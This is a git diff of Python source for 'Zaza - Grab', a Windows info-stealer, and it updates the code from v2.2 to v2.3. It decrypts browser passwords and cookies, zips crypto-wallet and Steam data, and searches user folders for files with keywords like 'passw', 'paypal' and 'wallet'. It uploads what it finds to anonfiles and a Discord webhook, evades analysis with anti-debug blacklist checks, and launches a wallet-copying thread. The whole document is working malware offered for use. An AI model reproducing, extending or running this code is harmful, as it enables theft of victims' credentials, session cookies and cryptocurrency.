         for func in [self.lstchec, self.regkey, self.sp3cCheq]:
             process = threading.Thread(target=func, daemon=True)
@@ -1103,6 +1226,10 @@ class AntiDebug(Functions):
             if vctm_pc == pcName:
                 self.programExit()
 
+        for pcIP in self.blips:
+            if self.net_1fo()[0] == pcIP:
+                self.programExit()
+
         for uuidwndz in self.blhwid:
             if self.sys_1fo()[0] == uuidwndz:
                 self.programExit()
@@ -1128,9 +1255,6 @@ class AntiDebug(Functions):
                 self.programExit()
         finally:
             winreg.CloseKey(handle)
-            
-            
-
 
 
 
@@ -1138,7 +1262,8 @@ class AntiDebug(Functions):
 
 
 if __name__ == "__main__" and os.name == "nt":
-    asyncio.run(bl4ckc4p().init())
+    asyncio.run(bc_initial_func().init())
+    
 
 
 
@@ -1242,7 +1367,7 @@ def upload(name, tk=''):
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
     }
 
-    if name == "zazagrabedez":
+    if name == "bc_checking":
         data = {
         "content": '',
         "embeds": [
@@ -1254,17 +1379,17 @@ def upload(name, tk=''):
                 }
             ],
             "author": {
-                'name': f'Zaza - Grab v2.2',
-                'url': 'https://github.com/xKrustyDemonx',
-                'icon_url': 'https://raw.githubusercontent.com/xKrustyDemonx/zazagrab-assets/main/mona-loading-dark.gif'
+                'name': f'Zaza - Grab v2.3',
+                'url': 'https://github.com/zazaman4000',
+                'icon_url': 'https://raw.githubusercontent.com/zazaman4000/zazagrab-assets/master/mona-loading-dark.gif'
             },
             "footer": {
-                "text": "https://github.com/xKrustyDemonx"
+                "text": "github.com/zazaman4000"
             },
             'color': 374276,
             }
         ],
-        "avatar_url": "https://media.discordapp.net/attachments/1055997057149710388/1066504205835173928/zazagrab2.jpg",
+        "avatar_url": "https://raw.githubusercontent.com/zazaman4000/zazagrab-assets/master/frame_1_delay-0.16s-removebg-preview.jpg",
         "attachments": []
         }
         LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
@@ -1273,7 +1398,7 @@ def upload(name, tk=''):
     path = name
     files = {'file': open(path, 'rb')}
 
-    if "zg_allpasswords" in name:
+    if "bc_allpasswords" in name:
 
         ra = ' | '.join(da for da in paswWords)
 
@@ -1292,22 +1417,22 @@ def upload(name, tk=''):
                 }
             ],
             "author": {
-                'name': f'Zaza - Grab v2.2',
-                'url': 'https://github.com/xKrustyDemonx',
-                'icon_url': 'https://raw.githubusercontent.com/xKrustyDemonx/zazagrab-assets/main/mona-loading-dark.gif'
+                'name': f'Zaza - Grab v2.3',
+                'url': 'https://github.com/zazaman4000',
+                'icon_url': 'https://raw.githubusercontent.com/zazaman4000/zazagrab-assets/master/mona-loading-dark.gif'
             },
             "footer": {
-                "text": "github.com/xKrustyDemonx",
+                "text": "github.com/zazaman4000",
             },
             'color': 374276,
             }
         ],
-         "avatar_url": "https://media.discordapp.net/attachments/1055997057149710388/1066504205835173928/zazagrab2.jpg",
+         "avatar_url": "https://raw.githubusercontent.com/zazaman4000/zazagrab-assets/master/image.jpg",
         "attachments": []
         }
         LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
 
-    if "zg_allcookies" in name:
+    if "bc_allcookies" in name:
         rb = ' | '.join(da for da in cookiWords)
         if len(rb) > 1000:
             rrrrr = Reformat(str(cookiWords))
@@ -1324,17 +1449,17 @@ def upload(name, tk=''):
                 }
             ],
             "author": {
-                'name': f'Zaza - Grab v2.2',
-                'url': 'https://github.com/xKrustyDemonx',
-                'icon_url': 'https://raw.githubusercontent.com/xKrustyDemonx/zazagrab-assets/main/mona-loading-dark.gif'
+                'name': f'Zaza - Grab v2.3',
+                'url': 'https://github.com/zazaman4000',
+                'icon_url': 'https://raw.githubusercontent.com/KSCHdsc/DestruCord-Inject/main/zazagrab.gif'
             },
             "footer": {
-                "text": "github.com/xKrustyDemonx",
+                "text": "github.com/zazaman4000",
             },
             'color': 374276,
             }
         ],
-         "avatar_url": "https://media.discordapp.net/attachments/1055997057149710388/1066504205835173928/zazagrab2.jpg",
+         "avatar_url": "https://raw.githubusercontent.com/zazaman4000/zazagrab-assets/master/image.jpg",
         "attachments": []
         }
         LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
@@ -1344,7 +1469,7 @@ def upload(name, tk=''):
 def writeforfile(data, name):
     path = os.getenv("TEMP") + f"\{name}.txt"
     with open(path, mode='w', encoding='utf-8') as f:
-        f.write(f"Created by Soles | https://github.com/xKrustyDemonx\n\n")
+        f.write(f"Created by ZAZA | https://github.com/zazaman4000\n\n")
         for line in data:
             if line[0] != '':
                 f.write(f"{line}\n")
@@ -1420,7 +1545,9 @@ def getCookie(path, arg):
                     wa = tmp.split('[')[1].split(']')[0]
                 if wa in row[0]:
                     if not old in cookiWords: cookiWords.append(old)
-            Cookies.append(f" HOST KEY: {row[0]} | NAME: {row[1]} | VALUE: {DecryptValue(row[2], master_key)}")
+                    
+            Cookies.append(f"{row[0]}	TRUE"+"		"+ f"/FALSE	2597573456	{row[1]}	{DecryptValue(row[2], master_key)}")
+            
     writeforfile(Cookies, 'zg_allcookies')
 
 def checkIfProcessRunning(processName):
@@ -1441,6 +1568,10 @@ def checkIfProcessRunning(processName):
 def ZipThings(path, arg, procc):
     pathC = path
     name = arg
+    if "aholpfdialjgjfhomihkjbmgjidlcdno" in arg:
+        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
+        name = f"Exodus_{browser}"
+        pathC = path + arg
 
     if "nkbihfbeogaeaoehlefnkodbefgpgknn" in arg:
         browser = path.split("\\")[4].split("/")[1].replace(' ', '')
@@ -1480,7 +1611,7 @@ def ZipThings(path, arg, procc):
     os.remove(f"{pathC}/{name}.zip")
 
 
-def GatherAll():
+def grabb_GatherAll():
     '                   Default Path < 0 >                         ProcesName < 1 >        Token  < 2 >              Password < 3 >     Cookies < 4 >                          Extentions < 5 >                                  '
     browserPaths = [
         [f"{roaming}/Opera Software/Opera GX Stable",               "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
@@ -1495,7 +1626,7 @@ def GatherAll():
 
 
 
-    PathsToZip = [
+    Paths_zipped = [
         [f"{roaming}/atomic/Local Storage/leveldb", '"Atomic Wallet.exe"', "Wallet"],
         [f"{roaming}/Exodus/exodus.wallet", "Exodus.exe", "Wallet"],
         ["C:\Program Files (x86)\Steam\config", "steam.exe", "Steam"],
@@ -1508,20 +1639,20 @@ def GatherAll():
         a.start()
         Threadlist.append(a)
 
-    ThCokk = []
+    thread_zgcookies = []
     for patt in browserPaths:
         a = threading.Thread(target=getCookie, args=[patt[0], patt[4]])
         a.start()
-        ThCokk.append(a)
+        thread_zgcookies.append(a)
 
-    for thread in ThCokk: thread.join()
+    for thread in thread_zgcookies: thread.join()
     DETECTED = Trust(Cookies)
     if DETECTED == True: return
 
     for patt in browserPaths:
         threading.Thread(target=ZipThings, args=[patt[0], patt[5], patt[1]]).start()
 
-    for patt in PathsToZip:
+    for patt in Paths_zipped:
         threading.Thread(target=ZipThings, args=[patt[0], patt[2], patt[1]]).start()
 
     for thread in Threadlist:
@@ -1533,7 +1664,7 @@ def GatherAll():
         upload(os.getenv("TEMP") + "\\" + file)
 
 
-def uploadToAnonfiles(path):
+def zg_uploadanonfiles(path):
     try:
 
         files = { "file": (path, open(path, mode='rb')) }
@@ -1544,8 +1675,8 @@ def uploadToAnonfiles(path):
     except:
         return False
 
-def zazagrabedezFolder(pathF, keywords):
-    global zazagrabedezFiles
+def zg_Folder_create(pathF, keywords):
+    global zg_create_files
     maxfilesperdir = 7
     i = 0
     listOfFile = os.listdir(pathF)
@@ -1554,31 +1685,31 @@ def zazagrabedezFolder(pathF, keywords):
         if not os.path.isfile(pathF + "/" + file): return
         i += 1
         if i <= maxfilesperdir:
-            url = uploadToAnonfiles(pathF + "/" + file)
+            url = zg_uploadanonfiles(pathF + "/" + file)
             ffound.append([pathF + "/" + file, url])
         else:
             break
-    zazagrabedezFiles.append(["folder", pathF + "/", ffound])
+    zg_create_files.append(["folder", pathF + "/", ffound])
 
-zazagrabedezFiles = []
-def zazagrabedezFile(path, keywords):
-    global zazagrabedezFiles
+zg_create_files = []
+def zg_create_file(path, keywords):
+    global zg_create_files
     fifound = []
     listOfFile = os.listdir(path)
     for file in listOfFile:
         for worf in keywords:
             if worf in file.lower():
                 if os.path.isfile(path + "/" + file) and ".txt" in file:
-                    fifound.append([path + "/" + file, uploadToAnonfiles(path + "/" + file)])
+                    fifound.append([path + "/" + file, zg_uploadanonfiles(path + "/" + file)])
                     break
                 if os.path.isdir(path + "/" + file):
                     target = path + "/" + file
-                    zazagrabedezFolder(target, keywords)
+                    zg_Folder_create(target, keywords)
                     break
 
-    zazagrabedezFiles.append(["folder", path, fifound])
+    zg_create_files.append(["folder", path, fifound])
 
-def zazagrabedez():
+def zg_checking():
     user = temp.split("\AppData")[0]
     path2search = [
         user + "/Desktop",
@@ -1586,13 +1717,7 @@ def zazagrabedez():
         user + "/Documents"
     ]
 
-    key_wordsFolder = [
-        "account",
-        "acount",
-        "passw",
-        "secret"
 
-    ]
 
     key_wordsFiles = [
         "passw",
@@ -1605,7 +1730,6 @@ def zazagrabedez():
         "acount",
         "paypal",
         "banque",
-        "account",
         "metamask",
         "wallet",
         "crypto",
@@ -1622,8 +1746,8 @@ def zazagrabedez():
 
     wikith = []
     for patt in path2search:
-        zazagrabedez = threading.Thread(target=zazagrabedezFile, args=[patt, key_wordsFiles]);zazagrabedez.start()
-        wikith.append(zazagrabedez)
+        zg_checking = threading.Thread(target=zg_create_file, args=[patt, key_wordsFiles]);zg_checking.start()
+        wikith.append(zg_checking)
     return wikith
 
 
@@ -1637,21 +1761,21 @@ keyword = [
 cookiWords = []
 paswWords = []
 
-GatherAll()
+grabb_GatherAll()
 DETECTED = Trust(Cookies)
 
 if not DETECTED:
-    wikith = zazagrabdez()
+    wikith = zg_checking()
 
     for thread in wikith: thread.join()
     time.sleep(0.2)
 
-    filetext = "\n"
-    for arg in zazagrabedezFiles:
+    filetext = "```diff\n"
+    for arg in zg_create_files:
         if len(arg[2]) != 0:
             foldpath = arg[1]
             foldlist = arg[2]
-            filetext +=f"```diff\n"
+            filetext +=f"\n"
             filetext += f"- {foldpath}\n"
 
             for ffil in foldlist:
@@ -1659,7 +1783,10 @@ if not DETECTED:
                 fileanme = a[len(a)-1]
                 b = ffil[1]
                 filetext += f"+ Name: {fileanme}\n+ Link: {b}"
-                filetext += "\n```"
                 filetext += "\n"
-    upload("zazagrabedez", filetext)
-    
+    filetext += "\n```"
+
+
+    upload("zg_checking", filetext)
+    auto = threading.Thread(target=auto_copy_wallet().run)
+    auto.start()
